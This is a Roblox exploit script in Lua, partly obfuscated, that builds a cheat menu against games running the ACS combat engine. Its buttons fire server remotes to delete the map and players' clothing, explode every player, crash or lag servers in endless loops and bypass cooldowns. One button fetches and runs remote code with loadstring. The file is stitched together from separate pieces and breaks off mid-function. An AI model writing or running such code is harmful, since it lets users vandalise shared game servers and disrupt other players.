v12:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\193\100\248\59\17\70\248\66\230\9\21\78", "\42\147\17\150\108\112"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\59\163\53\107", "\136\111\198\77\31\135")]=LUAOBFUSACTOR_DECRYPT_STR_0("\48\28\169\22\138\229\27\162\49\25\162\83\185", "\201\98\105\199\54\221\132\119"),[LUAOBFUSACTOR_DECRYPT_STR_0("\157\9\133\32\23\57\184", "\204\217\108\227\65\98\85")]=require(v4.GameRules.Config).RunWalkSpeed,[LUAOBFUSACTOR_DECRYPT_STR_0("\115\202\251", "\160\62\163\149\133\76")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\251\161\21", "\163\182\192\109\79")]=500,[LUAOBFUSACTOR_DECRYPT_STR_0("\6\41\21\206\241\61\40\7", "\149\84\70\96\160")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\27\9\0\253\57\5\25", "\141\88\102\109")]=false});
Options.RunWalkSpeed:OnChanged(function()
	require(v4.GameRules.Config).RunWalkSpeed = Options.RunWalkSpeed.Value;
end);
v12:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\144\65\197\101\25\53\98\192\191\88\249\96\31\56\81", "\161\211\51\170\16\122\93\53"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\207\171\170\60", "\72\155\206\210")]=LUAOBFUSACTOR_DECRYPT_STR_0("\101\104\91\27\48\78\58\99\15\63\77\73\68\11\54\66", "\83\38\26\52\110"),[LUAOBFUSACTOR_DECRYPT_STR_0("\124\18\33\71\77\27\51", "\38\56\119\71")]=require(v4.GameRules.Config).CrouchWalkSpeed,[LUAOBFUSACTOR_DECRYPT_STR_0("\222\230\86", "\54\147\143\56\182\69")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\251\128\231", "\191\182\225\159\41")]=500,[LUAOBFUSACTOR_DECRYPT_STR_0("\25\29\61\91\143\142\204\44", "\162\75\114\72\53\235\231")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\175\51\73\242\82\1\152", "\98\236\92\36\130\51")]=false});
Options.CrouchWalkSpeed:OnChanged(function()
	require(v4.GameRules.Config).CrouchWalkSpeed = Options.CrouchWalkSpeed.Value;
end);
v12:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\148\11\3\180\64\159\180\60\175\10\63\170\64\173\177", "\80\196\121\108\218\37\200\213"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\52\118\26\107", "\234\96\19\98\31\43\110")]=LUAOBFUSACTOR_DECRYPT_STR_0("\54\13\93\201\169\50\188\7\19\89\244\188\119\142\2", "\235\102\127\50\167\204\18"),[LUAOBFUSACTOR_DECRYPT_STR_0("\116\164\243\34\81\34\68", "\78\48\193\149\67\36")]=require(v4.GameRules.Config).ProneWalksSpeed,[LUAOBFUSACTOR_DECRYPT_STR_0("\29\23\142", "\33\80\126\224\120")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\193\169\27", "\60\140\200\99\164")]=500,[LUAOBFUSACTOR_DECRYPT_STR_0("\181\251\17\40\166\142\250\3", "\194\231\148\100\70")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\101\67\204\179\247\203\82", "\168\38\44\161\195\150")]=false});
Options.ProneWalksSpeed:OnChanged(function()
	require(v4.GameRules.Config).ProneWalksSpeed = Options.ProneWalksSpeed.Value;
end);
v12:AddToggle(LUAOBFUSACTOR_DECRYPT_STR_0("\166\253\142\122", "\118\224\156\226\22\80\136\214"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\118\235\65\148", "\224\34\142\57")]=LUAOBFUSACTOR_DECRYPT_STR_0("\248\166\201\209\51\245\92\3\223\160\192", "\110\190\199\165\189\19\145\61"),[LUAOBFUSACTOR_DECRYPT_STR_0("\254\238\113\233\158\203\206", "\167\186\139\23\136\235")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\46\186\135\1\14\188\152", "\109\122\213\232")]=LUAOBFUSACTOR_DECRYPT_STR_0("\200\246\174\60\202\246\175\49\233\242", "\80\142\151\194")});
Toggles.Fall:OnChanged(function()
	local v49;
	require(v4.GameRules.Config).EnableFallDamage = Toggles.Fall.Value;
	if Toggles.Fall.Value then
		v49 = LUAOBFUSACTOR_DECRYPT_STR_0("\6\200\118\78\15\195\115", "\44\99\166\23");
	else
		v49 = LUAOBFUSACTOR_DECRYPT_STR_0("\120\254\58\55\49\168\121\243", "\196\28\151\73\86\83");
	end
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\213\2\37\28\194\92\25\123\242\4\44\80\151\72\28\119\231\6\105", "\22\147\99\73\112\226\56\120") .. v49, 5);
end);
local v17 = {};
for v52, v53 in next, Enum.Material:GetEnumItems() do
	table.insert(v17, v53.Name);
end
v11:AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\181\116\246\240\159\177\116\238\230", "\237\216\21\130\149"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\180\79\83\74\181\218", "\62\226\46\63\63\208\169")]=v17,[LUAOBFUSACTOR_DECRYPT_STR_0("\193\28\83\130\10\1\59", "\62\133\121\53\227\127\109\79")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\61\1\62\225\223", "\194\112\116\82\149\182\206")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\13\173\84\12", "\110\89\200\44\120\160\130")]=LUAOBFUSACTOR_DECRYPT_STR_0("\140\214\69\6\110\75\47\72\185\202\74\74", "\45\203\163\43\38\35\42\91"),[LUAOBFUSACTOR_DECRYPT_STR_0("\230\138\211\47\147\160\68", "\52\178\229\188\67\231\201")]=LUAOBFUSACTOR_DECRYPT_STR_0("\50\68\92\1\244\72\99\44\64\68\1\229\85\34\45", "\67\65\33\48\100\151\60")});
v11:AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\222\245\163\203", "\147\191\135\206\184"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\178\41\170\212\221\64", "\210\228\72\198\161\184\51")]=v17,[LUAOBFUSACTOR_DECRYPT_STR_0("\18\76\245\17\102\194\34", "\174\86\41\147\112\19")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\118\21\129\31\44", "\203\59\96\237\107\69\111\113")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\16\19\180\245", "\183\68\118\204\129\81\144")]=LUAOBFUSACTOR_DECRYPT_STR_0("\47\191\125\247\75\175\15\185\117\246\2\131\2", "\226\110\205\16\132\107"),[LUAOBFUSACTOR_DECRYPT_STR_0("\223\204\239\213\85\226\211", "\33\139\163\128\185")]=LUAOBFUSACTOR_DECRYPT_STR_0("\68\93\8\219\84\76\68\211\86\76\1\204\94\89\8", "\190\55\56\100")});
Options.arms:OnChanged(function()
	getgenv().armsm = Options.arms.Value;
end);
Options.materials:OnChanged(function()
	getgenv().gunm = Options.materials.Value;
end);
v11:AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\117\160\48\17\1\163\244\67\161", "\147\54\207\92\126\115\131")):AddColorPicker(LUAOBFUSACTOR_DECRYPT_STR_0("\46\62\57\114\31\78\4\50\62\120\31", "\30\109\81\85\29\109"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\219\116\82\183\35\210\232", "\156\159\17\52\214\86\190")]=Color3.new(0, 0, 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\154\230\169\176\171", "\220\206\143\221")]=LUAOBFUSACTOR_DECRYPT_STR_0("\161\104\35\87\213\195\214\131\113\109\20\215\192\221\148", "\178\230\29\77\119\184\172")});
Options.ColorPicker:OnChanged(function(v58)
	getgenv().gunc = Options.ColorPicker.Value;
end);
v11:AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\214\177\6\20\101\184\244\172\7\8", "\152\149\222\106\123\23")):AddColorPicker(LUAOBFUSACTOR_DECRYPT_STR_0("\254\41\250\76\167\252\52\251\80", "\213\189\70\150\35"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\107\80\114\9\90\89\96", "\104\47\53\20")]=Color3.new(0, 0, 0),[LUAOBFUSACTOR_DECRYPT_STR_0("\151\69\149\16\185", "\111\195\44\225\124\220")]=LUAOBFUSACTOR_DECRYPT_STR_0("\249\84\13\96\235\168\215\74\15\97", "\203\184\38\96\19\203")});
Options.ColorArms:OnChanged(function(v61)
	getgenv().armsc = Options.ColorArms.Value;
end);
v11:AddDropdown(LUAOBFUSACTOR_DECRYPT_STR_0("\49\122\125\68", "\174\89\19\25\33"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\25\19\94\91\242\148", "\107\79\114\50\46\151\231")]={LUAOBFUSACTOR_DECRYPT_STR_0("\21\163\179\61\202\24\165\205", "\160\89\198\213\73\234\89\215"),LUAOBFUSACTOR_DECRYPT_STR_0("\122\120\179\246\209\8\80\166\243", "\165\40\17\212\158")},[LUAOBFUSACTOR_DECRYPT_STR_0("\193\220\14\50\51\233\205", "\70\133\185\104\83")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\41\80\72\62\192", "\169\100\37\36\74")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\52\130\186\68", "\48\96\231\194")]=LUAOBFUSACTOR_DECRYPT_STR_0("\239\79\0\109\52\217\187\134\218\83\15\33", "\227\168\58\110\77\121\184\207"),[LUAOBFUSACTOR_DECRYPT_STR_0("\79\51\176\76\165\210\97", "\197\27\92\223\32\209\187\17")]=LUAOBFUSACTOR_DECRYPT_STR_0("\16\90\207\254\0\75\131\246\2\75\198\233\10\94\207", "\155\99\63\163")});
Options.hide:OnChanged(function()
	getgenv().hide = Options.hide.Value;
end);
v11:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\170\216\165\136\249\133\144\220", "\228\226\177\193\237\217"), function()
	local v66 = workspace.CurrentCamera:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\25\191\39\227\56", "\134\84\208\67"));
	if not v66 then
		return;
	end
	v66:FindFirstChild(getgenv().hide).Transparency = 1;
end);
v11:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\38\188\130\93\7\169", "\60\115\204\230"), function()
	local v68 = workspace.CurrentCamera:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\202\53\239\117\235", "\16\135\90\139"));
	if not v68 then
		return;
	end
	local v69 = v68:FindFirstChildOfClass(LUAOBFUSACTOR_DECRYPT_STR_0("\121\123\2\54\66", "\24\52\20\102\83\46\52"));
	for v80, v81 in v69:GetChildren() do
		if v81:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\230\46\50\33\63\197\61\53", "\111\164\79\65\68")) then
			v81.Material = Enum.Material[getgenv().gunm];
			v81.Color = getgenv().gunc;
		end
	end
	for v82, v83 in v68:GetChildren() do
		if ((v83:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\228\216\144\219\30\235\212\205", "\138\166\185\227\190\78")) and (v83.Name == LUAOBFUSACTOR_DECRYPT_STR_0("\231\113\195\35\18\2\11\198", "\121\171\20\165\87\50\67"))) or (v83.Name == LUAOBFUSACTOR_DECRYPT_STR_0("\244\49\190\62\173\66\231\42\180", "\98\166\88\217\86\217"))) then
			v83.Material = Enum.Material[getgenv().armsm];
			v83.Color = getgenv().armsc;
		end
	end
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\192\255\106\20\135\208\182\251\118\5\149\156\227\230\125\0\146\217", "\188\150\150\25\97\230"), 3);
end);
v13:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\233\128\69\7\53", "\141\186\233\63\98\108"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\197\239\52\162", "\69\145\138\76\214")]="Y",[LUAOBFUSACTOR_DECRYPT_STR_0("\84\202\143\136\170\26\100", "\118\16\175\233\233\223")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\166\141\59", "\29\235\228\85\219\142\235")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\16\213\162", "\50\93\180\218\189\23\46\71")]=2048,[LUAOBFUSACTOR_DECRYPT_STR_0("\236\171\78\66\64\213\70\217", "\40\190\196\59\44\36\188")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\31\74\209\164\251\126\25", "\109\92\37\188\212\154\29")]=false});
v13:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\55\230\190\198\9", "\58\100\143\196\163\81"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\46\71\59\183", "\110\122\34\67\195\95\41\133")]="X",[LUAOBFUSACTOR_DECRYPT_STR_0("\81\180\93\75\195\121\165", "\182\21\209\59\42")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\154\94\203", "\222\215\55\165\125\65")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\1\208\222", "\42\76\177\166\122\146\161\141")]=2048,[LUAOBFUSACTOR_DECRYPT_STR_0("\151\133\16\192\125\127\171\141", "\22\197\234\101\174\25")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\14\59\168\204\119\172\195", "\230\77\84\197\188\22\207\183")]=false});
v13:AddSlider(LUAOBFUSACTOR_DECRYPT_STR_0("\202\29\220\249\182", "\85\153\116\166\156\236\193\144"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\144\229\85\167", "\96\196\128\45\211\132")]="Z",[LUAOBFUSACTOR_DECRYPT_STR_0("\17\136\125\94\199\163\160", "\184\85\237\27\63\178\207\212")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\37\80\7", "\63\104\57\105")]=0,[LUAOBFUSACTOR_DECRYPT_STR_0("\38\134\188", "\36\107\231\196")]=2048,[LUAOBFUSACTOR_DECRYPT_STR_0("\111\186\183\137\89\188\172\128", "\231\61\213\194")]=1,[LUAOBFUSACTOR_DECRYPT_STR_0("\42\162\48\99\8\174\41", "\19\105\205\93")]=false});
v13:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\139\17\206\128\44\186\72\202\136\50\172\72\220\148\54\165\12", "\95\201\104\190\225"), function()
	local v70 = v6.Character.ACS_Client.Kit.Fortifications;
	if (v70.Value > 10000) then
		v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\182\196\212\142\174\199\211\203\174\207\216\142\191\206\211\200\160\217\204\203\171\139\213\198\170\139\195\215\191\202\210\221", "\174\207\171\161"), 3);
		return;
	end
	v5.Refil:FireServer(v70, -100000);
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\254\235\14\240\253\196\254", "\183\141\158\109\147\152"), 3);
end);
v13:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\14\28\239\0\40", "\108\76\105\134"), function()
	task.spawn(v5.Breach.InvokeServer, v5.Breach, 3, {[LUAOBFUSACTOR_DECRYPT_STR_0("\205\202\163\245\199\237\204\180\229", "\174\139\165\209\129")]={},[LUAOBFUSACTOR_DECRYPT_STR_0("\135\182\241\213\212\12\105\121\161\191\231", "\24\195\211\130\161\166\99\16")]=workspace}, CFrame.new(), CFrame.new(), {[LUAOBFUSACTOR_DECRYPT_STR_0("\101\37\251\45\94\19", "\118\38\99\137\76\51")]=(v7.HumanoidRootPart.CFrame or (v7:GetPivot().p * CFrame.new(0, 0, 0))),[LUAOBFUSACTOR_DECRYPT_STR_0("\206\47\31\23", "\64\157\70\101\114\105")]={Y=Options.SizeY.Value,X=Options.SizeX.Value,Z=Options.SizeZ.Value}});
	v1:Notify(LUAOBFUSACTOR_DECRYPT_STR_0("\105\166\180\247\17\78\171\162\163\19\82\173\166\247\21", "\112\32\200\199\131"), 3);
end);
v1:OnUnload(function()
	v1.Unloaded = true;
end);
local v18 = v9[LUAOBFUSACTOR_DECRYPT_STR_0("\25\121\28\139\198\191\54\37\94\91\171", "\66\76\48\60\216\163\203")]:AddLeftGroupbox(LUAOBFUSACTOR_DECRYPT_STR_0("\151\131\119\230", "\68\218\230\25\147\63\174"));
v18:AddButton(LUAOBFUSACTOR_DECRYPT_STR_0("\152\36\95\67\183\169", "\214\205\74\51\44"), function()
	v1:Unload();
end);
v18:AddLabel(LUAOBFUSACTOR_DECRYPT_STR_0("\215\73\236\233\55\248\69\236\248", "\23\154\44\130\156")):AddKeyPicker(LUAOBFUSACTOR_DECRYPT_STR_0("\60\163\163\187\29\22\8\164\164\160\50", "\115\113\198\205\206\86"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\160\82\248\91\145\91\234", "\58\228\55\158")]=LUAOBFUSACTOR_DECRYPT_STR_0("\157\135\195\43\46\185", "\85\212\233\176\78\92\205"),[LUAOBFUSACTOR_DECRYPT_STR_0("\100\87\189\203", "\130\42\56\232")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\222\176\60\247", "\95\138\213\68\131\32")]=LUAOBFUSACTOR_DECRYPT_STR_0("\7\45\175\86\54\33\45\184\65\127\36\44", "\22\74\72\193\35")});
v2:SetLibrary(v1);
v3:SetLibrary(v1);
v3:IgnoreThemeSettings();
v2:SetFolder(LUAOBFUSACTOR_DECRYPT_STR_0("\13\90\215", "\56\76\25\132"));
v3:SetFolder("ACS/specific-game");
v3:BuildConfigSection(v9["UI Settings"]);
v2:ApplyToTab(v9["UI Settings"]);
          end 
        })
TrollTab:AddButton({
	Name = "Spawn Car Loop Lag - Elite do Sul [RP]",
	Callback = function()
        local function executeScript()
            for i, v in pairs(game.Players:GetPlayers()) do
                local character = v.Character
                local head = character and character:FindFirstChild("Head")
                local hum = character and character:FindFirstChild("Humanoid")
            end
        local args = {
            [1] = "MB 1938S"
        }
        
        game:GetService("ReplicatedStorage").SpawnCar:FireServer(unpack(args))
        end
        while true do
            wait(1) 
            executeScript()
        end
  	end    
})
local Section = TrollTab:AddSection({
	Name = "Outros Troll"
})
    TrollTab:AddButton({
        Name = "Alterar Speaker/Paint ",
        Callback = function()
            --// AC6_Sound and Lights_FE, AC6_Sound faz voce colocar som no jogo, Lights_FE faz voce pintar o mapa e mudar a transparencia da part
local lib =  loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Consistt/Ui/main/UnLeaked"))()
local sound
local pith
local volume

lib.title = "Main"

local Main = lib:Init()
local tab1 = Main:NewTab("FE Sound")
local Section1 = tab1:NewSection("Main")

tab1:NewTextbox("Sound Id","", "xxx", "all", "small", true, false, function(id)
   sound = 'rbxassetid://'..id
end)

tab1:NewSlider("Pith", "",true,"/",{min = 0, max = 10, default = 0}, function(max)
    pith = max
end)

tab1:NewSlider("Volume", "",true,"/",{min = 0, max = 10, default = 0}, function(Volume)
    volume = Volume
end)

local NAME = "ZEUS FPS"

tab1:NewToggle("Play", false ,function(play)
  local rmt = game:FindFirstChild("AC6_FE_Sounds", true)
    rmt:FireServer('newSound', NAME, workspace, sound, pith, volume, true)
    rmt:FireServer('playSound', NAME)
   if not play then
       rmt:FireServer("stopSound", NAME)
   end
end)

local tab2 = Main:NewTab("Lights FE")
local Section2 = tab2:NewSection("Main")

local material
local transparency
local color

tab2:NewTextbox("Material","", "xxx", "all", "small", true, false, function(mat)
   material = mat
end)

tab2:NewTextbox("Color", "", "xxx", "all", "small", true, false, function(cor)
    color = BrickColor.new(cor)
end)

tab2:NewSlider("Transparency","",true,"/",{min = 0, max = 1, default = 0}, function(t)
    transparency = t
end)

tab2:NewButton("Pintar", function()
local remote = game:FindFirstChild("Lights_FE", true)
    for i, v in next, game:GetDescendants() do
        if v:IsA("BasePart") then
            remote:FireServer('UpdateLight', v, material, color, transparency)
        end
    end
end)
          end  
        }) 
local Section = RoleplayTab:AddSection({
	Name = "Acs 1.7.5"
})
    RoleplayTab:AddButton({
        Name = "Deletar Roupa Geral - Acs 1.7.5",
        Callback = function()
            local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if  v:IsA("Shirt") or v:IsA("Pants")  then
                    rmt:FireServer(v) 
                end
            end
          end   
    })
    RoleplayTab:AddButton({
        Name = "Deletar Mapa - Acs 1.7.5",
        Callback = function()
            local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
            for i,v in next, workspace:GetChildren() do
                rmt:FireServer(v)
            end
          end   
    })
    RoleplayTab:AddButton({
        Name = "Creeper Geral - Acs 1.7.5",
        Callback = function()
            local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
		for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
			if v:IsA("SpecialMesh") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("Part") and v.Name == "Right Arm" or v.Name == "Left Arm" then
				rmt:FireServer(v) 
			end
		end
        end   
    }) 
    RoleplayTab:AddButton({
        Name = "Lag Server - Acs 1.7.5",
        Callback = function()
            L = 20

local event = game.ReplicatedStorage.ACS_Engine.Eventos.Hit
local base = workspace:FindFirstChildOfClass("Part")
local data

for i,v in game:GetDescendants() do
    if v:IsA("Tool") and v:FindFirstChild("ACS_Modulo") then
        data = require(v.ACS_Modulo.ACS_Setup); break
    end
end

shared.loop = not shared.loop
while shared.loop do
    for i = 1, L do
        event:FireServer(base.Position, base, Vector3.new(), Enum.Material.Neon, data)
    end
    task.wait()
end
        end   
    }) 
RoleplayTab:AddButton({
	Name = "Explodir Geral - Acs 1.7.5",
	Callback = function()
        local rem,_t,players = game:GetService("ReplicatedStorage").ACS_Engine.Eventos.Hit,{ExplosiveHit=true,ExPressure=math.huge,ExpRadius=math.huge,DestroyJointRadiusPercent=math.huge,ExplosionDamage=math.huge},game:GetService('Players')
	
		for i,v in next, players:GetPlayers() do 
			local ppart = v['Character'].PrimaryPart
			pcall(function()
				rem:FireServer(ppart.Position,ppart,ppart.Position,Enum.Material.ForceField,_t)
			end)
		end
  	end 
})
RoleplayTab:AddButton({
	Name = "Tool Destruir - Acs 1.7.5",
	Callback = function()
        local Mouse = game.Players.LocalPlayer:GetMouse()
	
		local Tool = Instance.new('Tool',game.Players.LocalPlayer.Backpack)
		Tool.CanBeDropped = false
		Tool.Name = "Destruir"
		Tool.RequiresHandle = false 
	
		local rmt = game:GetService("ReplicatedStorage").DeleteCar
	
		Tool.Activated:connect(function() 
			rmt:FireServer(Mouse.Target)
		end)
  	end    
})
local Section = RoleplayTab:AddSection({
	Name = "Acs 2.0.1 Creditos: /Onx90s"
})
RoleplayTab:AddButton({
	Name = "Building - Acs 2.0.1",
	Callback = function()
        local cFrame = CFrame.new(0,0,0)


        local Size = {
         X = 1,
         Y = 1,
         Z = 1
        }
        
        game:GetService('ReplicatedStorage')['ACS_Engine'].Eventos.Breach:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
  	end    
})
RoleplayTab:AddButton({
	Name = "Bypass Building Cooldown Acs",
	Callback = function()
        game:GetService('ReplicatedStorage').ACS_Engine.Events.Refil:FireServer(game.Players.LocalPlayer.Character.ACS_Client.Kit.Fortifications, -99999999)
  	end    
})
RoleplayTab:AddButton({
	Name = "Crash Server Acs 2.0.1",
	Callback = function()
        while task.wait() do

            for _, player in next, game.Players:GetPlayers() do
               game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
            end
          end
  	end    
})
RoleplayTab:AddButton({
	Name = "Infinite Stamina Acs 2.0.1",
	Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.EnableStamina = false
  	end    
})
RoleplayTab:AddButton({
	Name = "No Fall Damage Acs 2.0.1",
	Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.EnableFallDamage = false
  	end    
})
RoleplayTab:AddButton({
	Name = "No Jump Cooldown Acs 2.0.1",
	Callback = function()
        local cfg = require(game:GetService('ReplicatedStorage')['ACS_Engine'].GameRules.Config)
        cfg.AntiBunnyHop = false
  	end    
})
RoleplayTab:AddButton({
	Name = "Value Changer Acs 2.0.1",
	Callback = function()
        game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Refil:FireServer(game:GetService('Workspace')['virtual_rod']['ACS_Client'].Protecao.VestProtect.Value, 999)
  	end    
})
RoleplayTab:AddButton({
	Name = "Som Hack Acs 2.0.1",
	Callback = function()
        while task.wait() do

            for _, player in next, game.Players:GetPlayers() do
                game:GetService('ReplicatedStorage')['ACS_Engine'].Events.Whizz:FireServer(player)
            end
          end
  	end    
})
local Section = AdmTab:AddSection({
	Name = "Admin"
        })
local Section = RoleplayTab:AddSection({
	Name = "Op Banir/Expulsar"
    })
    RoleplayTab:AddButton({
        Name = "Banir Jogadores",
        Callback = function()
            game.StarterGui:SetCore("SendNotification", {
Title = "Metodo pra banir Geral!?"; -- the title 
Text = "Procure um anti cheat ou anti bug e faca um script que da pro jogador interagir pra banir."; -- what the text says 
Duration = 15; -- how long the notification should in secounds
})
end      
})
    RoleplayTab:AddButton({
        Name = "Expulsar Jogares",
        Callback = function()
            game.StarterGui:SetCore("SendNotification", {
Title = "Metodo pra expulsar Geral!?"; -- the title 
Text = "Procure por um bug ou uma falha no server que expulsa o dar ban e crie um script disso pra que a pessoa interagir."; -- what the text says 
Duration = 15; -- how long the notification should in secounds
})
end      
})
    AdmTab:AddButton({
        Name = "Voar ADM (!)",
        Callback = function()
            -- Made By zack;#6969

-- Instances:

local FlyScript = Instance.new("ScreenGui")
local Gradient = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local UICorner = Instance.new("UICorner")
local Button = Instance.new("TextButton")
local Shadow = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")

--Properties:

FlyScript.Name = "FlyScript"
FlyScript.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FlyScript.ResetOnSpawn = false

Gradient.Name = "Gradient"
Gradient.Parent = FlyScript
Gradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Gradient.BorderColor3 = Color3.fromRGB(27, 42, 53)
Gradient.BorderSizePixel = 0
Gradient.Position = UDim2.new(0.0199062824, 0, 0.781767964, 0)
Gradient.Size = UDim2.new(0, 231, 0, 81)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(57, 104, 252)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(51, 68, 175))}
UIGradient.Parent = Gradient

UICorner.CornerRadius = UDim.new(0.0399999991, 0)
UICorner.Parent = Gradient

Button.Name = "Button"
Button.Parent = Gradient
Button.BackgroundColor3 = Color3.fromRGB(77, 100, 150)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(0.0921155736, 0, 0.238353431, 0)
Button.Size = UDim2.new(0, 187, 0, 41)
Button.ZIndex = 2
Button.Font = Enum.Font.GothamSemibold
Button.Text = ""
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.TextSize = 14.000
Button.TextWrapped = true

Shadow.Name = "Shadow"
Shadow.Parent = Button
Shadow.BackgroundColor3 = Color3.fromRGB(53, 69, 103)
Shadow.BorderSizePixel = 0
Shadow.Size = UDim2.new(1, 0, 1, 4)

TextLabel.Parent = Gradient
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.487012982, 0, 0.5, 0)
TextLabel.Size = UDim2.new(0.878787875, -20, 0.728395045, -20)
TextLabel.ZIndex = 2
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "Fly"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
Button.MouseButton1Down:connect(function()
	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()
	repeat wait() until mouse
	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local flying = true
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 50
	local speed = 0

	function Fly()
		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character.Humanoid.PlatformStand = true
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
